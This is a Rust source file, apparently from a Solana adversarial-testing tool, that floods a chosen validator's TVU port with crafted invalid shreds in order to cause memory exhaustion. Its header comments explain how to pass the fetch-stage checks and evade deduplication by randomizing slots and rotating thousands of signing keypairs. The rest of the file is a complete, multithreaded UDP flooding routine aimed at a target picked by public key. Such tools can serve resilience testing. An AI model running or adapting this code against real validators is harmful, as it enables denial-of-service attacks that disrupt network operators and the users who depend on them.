//! Attack flood validator TVU port with invalid shreds in an attempt to increase memory load
//! and potentially cause an OOM.
//!
//! The most effective strategy is to create dummy shreds that are structured in a way that they
//! get to the shred_sigverify stage. This requires bypassing the dedupper and the checks in the
//! shred fetch stage.
//!
//! Most of the checks in the shred fetch stage are in should_discard_shred():
//! 1. shred slot is between root and max_slot+1
//!     - max_slot = last_slot + MAX_SHRED_DISTANCE_MINIMUM.max(2 * slots_per_epoch);
//! 2. must be well-formed enough so shred, version, variant, slot, index, etc can be parsed out
//! 3. version must equal the current shred_version
//! 4. for data shreds: index must be < MAX_DATA_SHREDS_PER_SLOT
//! 5. for code shreds: index must be < MAX_CODE_SHREDS_PER_SLOT
//! 6. slot value must be higher than parent slot value
//! 7. parent must be >= root
//!
//! These are all relatively easy to satisfy.
//!
//! There are a lot of potential ways to bypass the dedupper but the easiest I found was to send
//! in the same shred but sample the slot index from a random distribution, within the ranges defined
//! above.

use {
    clap::Args,
    humantime::Duration,
    log::info,
    rand::{
        distributions::{Distribution, Uniform},
        rngs::SmallRng,
        SeedableRng,
    },
    solana_clock::Slot,
    solana_commitment_config::CommitmentConfig,
    solana_hash::Hash,
    solana_keypair::Keypair,
    solana_ledger::shred::{
        ProcessShredsStats,
        // Re-exported by the crate
        ReedSolomonCache,
        Shred,
        Shredder,
    },
    solana_net_utils::bind_to_unspecified,
    solana_pubkey::Pubkey,
    solana_rpc_client::nonblocking::rpc_client::RpcClient,
    std::{
        fmt::Debug,
        str::FromStr,
        sync::{
            atomic::{AtomicUsize, Ordering},
            Arc,
        },
        thread,
        time::{Duration as StdDuration, Instant},
    },
};

#[derive(Args, Debug)]
pub struct InvalidShredsArgs {
    /// The public key of the target validatro
    #[arg(long, value_name = "PUBKEY")]
    pub target_validator: Pubkey,

    /// Number of broadcast threads to use for the attack
    #[arg(long, value_name = "COUNT", default_value_t = 4)]
    pub broadcast_threads: u32,

    /// Time duration for the whole attack.
    #[arg(long, value_name = "TIME", default_value_t = StdDuration::from_secs(10).into())]
    pub total_duration: Duration,

    /// Number of distinct signer per broadcast thread. The fewer slots available in the epoch
    /// the higher this value needs to be in order to get around the de-dupper -- ie this increases
    /// the "space" of shreds that are sent out.
    #[arg(long, value_name = "COUNT", default_value_t = 1000)]
    pub distinct_signers: u32,
}

pub async fn run(json_rpc_url: &str, args: InvalidShredsArgs) -> Result<(), String> {
    let rpc_client =
        RpcClient::new_with_commitment(json_rpc_url.to_owned(), CommitmentConfig::confirmed());

    let InvalidShredsArgs {
        target_validator,
        broadcast_threads,
        total_duration,
        distinct_signers,
    } = args;

    // use validator pubkey to fetch validator tvu address and shred version
    let nodes = rpc_client
        .get_cluster_nodes()
        .await
        .expect("failed to fetch cluster node info from rpc");
    let node = nodes
        .iter()
        .find(|node| Pubkey::from_str(node.pubkey.as_str()).unwrap() == target_validator)
        .ok_or_else(|| {
            "failed to find validator corresponding to provided public key".to_string()
        })?;
    let tvu_addr = node
        .tvu
        .ok_or_else(|| "validator node config doesn't contain tvu endpoint data".to_string())?;
    let shred_version = node
        .shred_version
        .ok_or_else(|| "validator node config doesn't contain shred version".to_string())?;

    // get current slot from rpc. this will be used as a reference point for determining which slot to use for shreds
    let start_slot = rpc_client
        .get_slot()
        .await
        .expect("failed to fetch slot from rpc");
    let slots_per_epoch = rpc_client
        .get_epoch_info()
        .await
        .expect("failed to fetch epoch info from rpc")
        .slots_in_epoch;

    let start_time = Instant::now();
    let sent_shreds_count = Arc::new(AtomicUsize::new(0));

    info!(
        "JSON RPC url: {json_rpc_url}\nGoing to attack validator {target_validator} at \
         {tvu_addr}\nwith {broadcast_threads} broadcast threads for {total_duration} seconds.",
    );

    (0..broadcast_threads)
        .map(|i| {
            let sent_shreds_count = sent_shreds_count.clone();
            let duration: StdDuration = total_duration.into();
            let version = shred_version;

            // this represents the lower bound of the random distribution used below for calculating a shred's
            // slot index. We don't refresh this value so it will go stale after 1 epoch, but the attack should
            // be completed by then.
            let start_slot = start_slot.saturating_add(slots_per_epoch);

            // initialize thread-local UDP socket
            let send_socket = bind_to_unspecified().expect("Failed to bind to unspecified address");

            // ring of shreds to iterate over. We replace the slot idx of a shred with a random _valid_ value
            // before sending it out but if epochs are short than the random distro we're sampling from is small.
            // the shorter the epochs, the larger this ring needs to be in order to bypass dedup.
            let shreds = get_dummy_merkle_shreds(distinct_signers, version);

            info!("starting UDP sender thread {i}");
            thread::spawn(move || {
                let dist_slot = Uniform::from(0..slots_per_epoch);
                let mut rng = SmallRng::from_entropy();
                let mut shred_idx: u32 = 0;

                // process shreds from the channel
                while start_time.elapsed() < duration {
                    let mut shred = shreds[shred_idx as usize].clone();
                    shred.set_slot(start_slot.saturating_add(dist_slot.sample(&mut rng)));
                    if let Err(e) = send_socket.send_to(shred.payload().as_ref(), tvu_addr) {
                        eprintln!("error sending shred: {e}");
                        // continue rather than exit because send_to() may occasionally return an ENOBUFS error
                        // due to congestion in the networking stack.
                        continue;
                    }

                    shred_idx = (shred_idx.saturating_add(1))
                        .checked_rem(distinct_signers)
                        .expect("invalid value for distinct_signers");
                    sent_shreds_count.fetch_add(1, Ordering::Relaxed);
                }
            })
        })
        .for_each(|b| b.join().expect("error joining broadcast thread"));

    info!(
        "Finished sending {} shreds",
        sent_shreds_count.load(Ordering::Relaxed)
    );
    Ok(())
}

fn get_dummy_merkle_shreds(n: u32, version: u16) -> Vec<Shred> {
    (0..n)
        .map(|_| {
            let keypair: Keypair = Keypair::new();

            // we only need one shred from this set -- varying slot on copies of this shred is
            // sufficient to get around any filters prior to sigverify occuring.
            let shreds = create_merkle_data_shreds(1_u64, version, &keypair);
            assert!(!shreds.is_empty());
            shreds[0].clone()
        })
        .collect()
}

fn create_merkle_data_shreds(slot: Slot, version: u16, keypair: &Keypair) -> Vec<Shred> {
    // For Merkle shreds, we'll need to use the Shredder to properly construct them since
    // the shred::merkle module doesn't export any functions for directly building them
    let reference_tick = 0;
    let shredder = Shredder::new(slot, slot.saturating_sub(1), reference_tick, version)
        .expect("Failed to create shredder");

    let (shreds, _) = shredder.entries_to_merkle_shreds_for_tests(
        keypair,
        &[], // empty but this should still produce valid shreds
        true,
        Hash::default(),
        0,
        0,
        &ReedSolomonCache::default(),
        &mut ProcessShredsStats::default(),
    );

    assert!(!shreds.is_empty());
    shreds
}
